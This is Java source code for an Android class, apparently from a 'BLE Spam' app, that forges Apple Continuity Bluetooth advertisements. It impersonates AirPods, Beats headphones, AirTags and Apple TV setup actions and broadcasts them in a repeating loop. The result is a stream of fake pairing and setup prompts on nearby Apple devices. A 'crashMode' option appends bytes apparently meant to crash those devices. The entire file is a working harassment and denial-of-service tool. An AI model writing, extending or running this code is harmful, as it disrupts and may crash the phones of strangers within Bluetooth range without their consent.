package com.tutozz.blespam;

import android.bluetooth.le.AdvertiseData;
import android.os.Build;

import java.util.HashMap;
import java.util.Map;
import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
public class ContinuitySpam implements Spammer {
    public Runnable blinkRunnable;
    public ContinuityDevice[] devices;
    private int loop = 0;
    public boolean isSpamming = false;
    public boolean crashMode;
    ExecutorService executor = Executors.newSingleThreadExecutor();

    private final Random rand = new Random();

    private static final String COLOR_KEY_DEFAULT = "00"; // fallback
    private static final String CONTINUITY_TYPE = "07";
    private static final String PAYLOAD_SIZE = "19";
    private static final String STATUS = "55";

    private static final Map<String, String[]> DEVICE_COLORS = new HashMap<>();
    static {
        // white
        DEVICE_COLORS.put("0E20", new String[] { "00" });
        DEVICE_COLORS.put("0220", new String[] { "00" });
        DEVICE_COLORS.put("0F20", new String[] { "00" });
        DEVICE_COLORS.put("1320", new String[] { "00" });
        DEVICE_COLORS.put("1420", new String[] { "00" });
        // airpods max
        DEVICE_COLORS.put("0A20", new String[] { "00","02","03","0F","11" });
        // beats flex
        DEVICE_COLORS.put("1020", new String[] { "00","01" });
        // beats solo 3 (partial list from Kotlin)
        DEVICE_COLORS.put("0620", new String[] {
                "00","01","06","07","08","09","0E","0F","12","13","14","15","1D","20","21","22","23","25","2A","2E","3D","3E","3F","40","5B","5C"
        });
        // powerbeats 3
        DEVICE_COLORS.put("0320", new String[] { "00","01","0B","0C","0D","12","13","14","15","17" });
        // powerbeats pro
        DEVICE_COLORS.put("0B20", new String[] { "00","02","03","04","05","06","0B","0D" });
        // beats solo pro
        DEVICE_COLORS.put("0C20", new String[] { "00","01" });
        // beats studio buds
        DEVICE_COLORS.put("1120", new String[] { "00","01","02","03","04","06" });
        // beats x
        DEVICE_COLORS.put("0520", new String[] { "00","01","02","05","1D","25" });
        // beats studio 3 (partial)
        DEVICE_COLORS.put("0920", new String[] { "00","01","02","03","18","19","25","26","27","28","29","42","43" });
        // beats studio pro
        DEVICE_COLORS.put("1720", new String[] { "00","01" });
        // beats fit pro
        DEVICE_COLORS.put("1220", new String[] { "00","01","02","03","04","05","06","07","08","09" });
        // beats studio buds (alt)
        DEVICE_COLORS.put("1620", new String[] { "00","01","02","03","04" });
        // airtag-like (we can keep default color)
        DEVICE_COLORS.put("0055", new String[] { "00" });
        DEVICE_COLORS.put("0030", new String[] { "00" });
    }

    private static final Map<String, String> DEVICE_DATA = new HashMap<>();
    static {
        DEVICE_DATA.put("0E20", "AirPods Pro");
        DEVICE_DATA.put("0A20", "AirPods Max");
        DEVICE_DATA.put("0220", "AirPods");
        DEVICE_DATA.put("0F20", "AirPods 2nd Gen");
        DEVICE_DATA.put("1320", "AirPods 3rd Gen");
        DEVICE_DATA.put("1420", "AirPods Pro 2nd Gen");
        DEVICE_DATA.put("1020", "Beats Flex");
        DEVICE_DATA.put("0620", "Beats Solo 3");
        DEVICE_DATA.put("0320", "Powerbeats 3");
        DEVICE_DATA.put("0B20", "Powerbeats Pro");
        DEVICE_DATA.put("0C20", "Beats Solo Pro");
        DEVICE_DATA.put("1120", "Beats Studio Buds");
        DEVICE_DATA.put("0520", "Beats X");
        DEVICE_DATA.put("0920", "Beats Studio 3");
        DEVICE_DATA.put("1720", "Beats Studio Pro");
        DEVICE_DATA.put("1220", "Beats Fit Pro");
        DEVICE_DATA.put("1620", "Beats Studio Buds+");
    }

    public ContinuitySpam(ContinuityDevice.type type, boolean crashMode) {
        this.crashMode = crashMode;
        switch (type) {
            default:
            case DEVICE:
                devices = new ContinuityDevice[]{
                        new ContinuityDevice("0x0E20", "AirPods Pro 2 GEN", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x1420", "AirPods Pro 1 GEN", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x0E20", "AirPods Pro", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x0620", "Beats Solo 3", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x0A20", "AirPods Max", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x1020", "Beats Flex", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x0055", "Airtag", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x0030", "Hermes Airtag", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x0220", "AirPods", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x0F20", "AirPods 2nd Gen", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x1320", "AirPods 3rd Gen", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x1420", "AirPods Pro 2nd Gen", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x0320", "Powerbeats 3", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x0B20", "Powerbeats Pro", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x0C20", "Beats Solo Pro", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x1120", "Beats Studio Buds", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x0520", "Beats X", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x0920", "Beats Studio 3", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x1720", "Beats Studio Pro", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x1220", "Beats Fit Pro", ContinuityDevice.type.DEVICE),
                        new ContinuityDevice("0x1620", "Beats Studio Buds+", ContinuityDevice.type.DEVICE)
                };
                break;
            case NOTYOURDEVICE:
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    devices = DEVICE_DATA.entrySet().stream()
                            .map(entry -> new ContinuityDevice("0x" + entry.getKey(), entry.getValue() + " (NOT YOUR)", ContinuityDevice.type.NOTYOURDEVICE))
                            .toArray(ContinuityDevice[]::new);
                }
                break;
            case ACTION:
                devices = new ContinuityDevice[]{
                        new ContinuityDevice("0x13", "AppleTV AutoFill", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x27", "AppleTV Connecting...", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x20", "Join This AppleTV?", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x19", "AppleTV Audio Sync", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x1E", "AppleTV Color Balance", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x09", "Setup New iPhone", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x02", "Transfer Phone Number", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x0B", "HomePod Setup", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x01", "Setup New AppleTV", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x06", "Pair AppleTV", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x0D", "HomeKit AppleTV Setup", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x2B", "AppleID for AppleTV?", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x05", "Apple Watch", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x24", "Apple Vision Pro", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x2F", "Connect to other Device", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x21", "Software Update", ContinuityDevice.type.ACTION),
                        new ContinuityDevice("0x2E", "Unlock with Apple Watch", ContinuityDevice.type.ACTION)
                };
                break;
        }
    }

    // --- HEX helpers ---
    private String toHexByte(int b) {
        return String.format("%02X", b & 0xFF);
    }

    private String getRandomBudsBatteryLevelHex() {
        int level = ((rand.nextInt(10) << 4) + rand.nextInt(10)) & 0xFF;
        return toHexByte(level);
    }

    private String getRandomChargingCaseBatteryLevelHex() {
        int level = (((rand.nextInt(8) % 8) << 4) + (rand.nextInt(10) % 10)) & 0xFF;
        return toHexByte(level);
    }

    private String getRandomLidOpenCounterHex() {
        int counter = rand.nextInt(256);
        return toHexByte(counter);
    }

    private String getRandomHexBytes(int length) {
        byte[] b = new byte[length];
        rand.nextBytes(b);
        StringBuilder sb = new StringBuilder();
        for (byte by : b) {
            sb.append(String.format("%02X", by & 0xFF));
        }
        return sb.toString();
    }

    private String pickRandomColorForDevice(String deviceIdNoPrefix) {
        String[] arr = DEVICE_COLORS.get(deviceIdNoPrefix);
        if (arr == null || arr.length == 0) return COLOR_KEY_DEFAULT;
        return arr[rand.nextInt(arr.length)];
    }

    private String buildContinuityPayload(String prefixHex, String deviceIdHex, String colorHex) {
        String buds = getRandomBudsBatteryLevelHex();
        String charging = getRandomChargingCaseBatteryLevelHex();
        String lid = getRandomLidOpenCounterHex();
        if (colorHex == null || colorHex.isEmpty()) colorHex = COLOR_KEY_DEFAULT;

        String payload = CONTINUITY_TYPE
                + PAYLOAD_SIZE
                + prefixHex
                + deviceIdHex
                + STATUS
                + buds
                + charging
                + lid
                + colorHex
                + "00";

        payload += getRandomHexBytes(16);
        return payload;
    }

    public void start() {
        executor.execute(() -> {
            BluetoothAdvertiser b = new BluetoothAdvertiser();
            isSpamming = true;
            for (loop = 0; loop <= Helper.MAX_LOOP; loop++) {
                if (isSpamming) {
                    ContinuityDevice device = devices[rand.nextInt(devices.length)];
                    AdvertiseData data = null;

                    if (device.getDeviceType() == ContinuityDevice.type.ACTION) {
                        String rHex = Helper.randomHexFiller(6);
                        String manufacturerData = "0F05C0" + device.getValue() + rHex;
                        if (crashMode) {
                            manufacturerData = "0F05C0" + device.getValue() + rHex + "000010" + rHex;
                        }
                        data = new AdvertiseData.Builder()
                                .addManufacturerData(0x004C, Helper.convertHexToByteArray(manufacturerData))
                                .build();

                    } else if (device.getDeviceType() == ContinuityDevice.type.NOTYOURDEVICE) {
                        // NOT YOUR DEVICE: prefix = "01", choose random color based on device id
                        String deviceVal = device.getValue().replace("0x", "").replace("0X", "").toUpperCase();
                        String color = pickRandomColorForDevice(deviceVal);
                        String manufacturerData = buildContinuityPayload("01", deviceVal, color);

                        data = new AdvertiseData.Builder()
                                .addManufacturerData(0x004C, Helper.convertHexToByteArray(manufacturerData))
                                .build();

                    } else { // DEVICE
                        String deviceVal = device.getValue().replace("0x", "").replace("0X", "").toUpperCase();
                        // prefix = "07" (new device)
                        String manufacturerData = buildContinuityPayload("07", deviceVal, pickRandomColorForDevice(deviceVal));
                        data = new AdvertiseData.Builder()
                                .addManufacturerData(0x004C, Helper.convertHexToByteArray(manufacturerData))
                                .build();
                    }

                    // Advertise
                    b.advertise(data, null);

                    // Wait
                    try {
                        System.out.println(Helper.delay);
                        Thread.sleep(Helper.delay);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }

                    // Stop advertise (start next)
                    b.stopAdvertising();
                }
            }
        });
    }

    public boolean isSpamming() {
        return isSpamming;
    }

    public void stop() {
        loop = Helper.MAX_LOOP + 1;
        isSpamming = false;
    }

    public Runnable getBlinkRunnable() {
        return blinkRunnable;
    }

    public void setBlinkRunnable(Runnable blinkRunnable) {
        this.blinkRunnable = blinkRunnable;
    }
}
